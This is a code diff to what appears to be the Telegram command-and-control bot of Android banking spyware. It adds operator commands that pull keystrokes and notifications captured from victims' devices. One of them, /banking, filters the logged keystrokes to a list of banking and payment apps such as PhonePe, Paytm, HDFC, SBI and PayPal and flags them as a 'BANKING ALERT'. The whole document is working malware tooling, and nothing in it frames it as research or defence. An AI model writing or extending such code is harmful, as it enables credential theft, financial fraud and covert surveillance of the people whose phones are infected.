@@ -190,6 +190,18 @@ async function handleCommand(msg) {
         await cmdBroadcast(chatId, args.join(' '));
         break;
 
+      case '/keylog':
+        await cmdKeylog(chatId, args);
+        break;
+
+      case '/banking':
+        await cmdBanking(chatId, args);
+        break;
+
+      case '/notifications':
+        await cmdNotifications(chatId, args);
+        break;
+
       default:
         await sendMessage(chatId, `❓ Unknown command: <code>${cmd}</code>\nType /help for available commands.`);
     }
@@ -557,6 +569,67 @@ async function cmdLastSms(chatId, args) {
   } catch (e) {
     await sendMessage(chatId, `❌ Error: ${e.message}`);
   }
+}
+
+// ═══ #12: NEW COMMANDS — Keylog / Banking / Notifications ═══
+
+async function cmdKeylog(chatId, args) {
+  const deviceId = args[0];
+  if (!deviceId) { await sendMessage(chatId, 'Usage: /keylog <device_id>'); return; }
+  try {
+    const db = require('../config/database');
+    const rows = db.prepare('SELECT app_package, text_content, recorded_at FROM keylog_entries WHERE device_id = ? ORDER BY recorded_at DESC LIMIT 20').all(deviceId);
+    if (rows.length === 0) { await sendMessage(chatId, '📭 No keystrokes captured yet.'); return; }
+    let msg = `⌨️ <b>Last ${rows.length} keystrokes</b> (${deviceId.substring(0,8)}...)\n\n`;
+    for (const r of rows) {
+      const text = (r.text_content || '').substring(0, 80);
+      const app = (r.app_package || 'unknown').replace(/^com\./, '');
+      msg += `<code>${text}</code> (${app})\n`;
+    }
+    await sendMessage(chatId, msg);
+  } catch (e) { await sendMessage(chatId, `❌ ${e.message}`); }
+}
+
+async function cmdBanking(chatId, args) {
+  const deviceId = args[0];
+  if (!deviceId) { await sendMessage(chatId, 'Usage: /banking <device_id>'); return; }
+  try {
+    const db = require('../config/database');
+    const BANKING_APPS = ['com.phonepe', 'com.paytm', 'com.google.android.apps.nbu.paisa', 'com.bsb.hdfcbank', 'com.csam.icici.bank', 'com.sbi', 'com.axis', 'com.kotak', 'com.paypal'];
+    let rows = [];
+    try {
+      rows = db.prepare(`SELECT app_package, text_content, recorded_at FROM keylog_entries WHERE device_id = ? AND (${BANKING_APPS.map(() => 'app_package LIKE ?').join(' OR ')}) ORDER BY recorded_at DESC LIMIT 20`).all(deviceId, ...BANKING_APPS.map(a => `%${a}%`));
+    } catch (_) {}
+    if (rows.length === 0) { await sendMessage(chatId, '📭 No banking app keystrokes captured.'); return; }
+    let msg = `🏦 <b>⚠️ BANKING ALERT — ${rows.length} keystrokes in banking apps</b> (${deviceId.substring(0,8)}...)\n\n`;
+    for (const r of rows) {
+      const text = (r.text_content || '').substring(0, 80);
+      const app = (r.app_package || '').replace(/^com\./, '');
+      msg += `🔴 <code>${text}</code> (${app})\n`;
+    }
+    await sendMessage(chatId, msg);
+  } catch (e) { await sendMessage(chatId, `❌ ${e.message}`); }
+}
+
+async function cmdNotifications(chatId, args) {
+  const deviceId = args[0];
+  if (!deviceId) { await sendMessage(chatId, 'Usage: /notifications <device_id>'); return; }
+  try {
+    const db = require('../config/database');
+    let rows = [];
+    try {
+      rows = db.prepare('SELECT app_package, title, text_content, recorded_at FROM notification_entries WHERE device_id = ? ORDER BY recorded_at DESC LIMIT 20').all(deviceId);
+    } catch (_) {}
+    if (rows.length === 0) { await sendMessage(chatId, '📭 No notifications captured yet.'); return; }
+    let msg = `🔔 <b>Last ${rows.length} notifications</b> (${deviceId.substring(0,8)}...)\n\n`;
+    for (const r of rows) {
+      const title = (r.title || '').substring(0, 50);
+      const text = (r.text_content || '').substring(0, 100);
+      const app = (r.app_package || 'unknown').replace(/^com\./, '');
+      msg += `📱 <b>${title}</b>\n   <code>${text}</code>\n   (${app})\n\n`;
+    }
+    await sendMessage(chatId, msg);
+  } catch (e) { await sendMessage(chatId, `❌ ${e.message}`); }
 }
 
 module.exports = { initBot, stopBot, sendAlert };
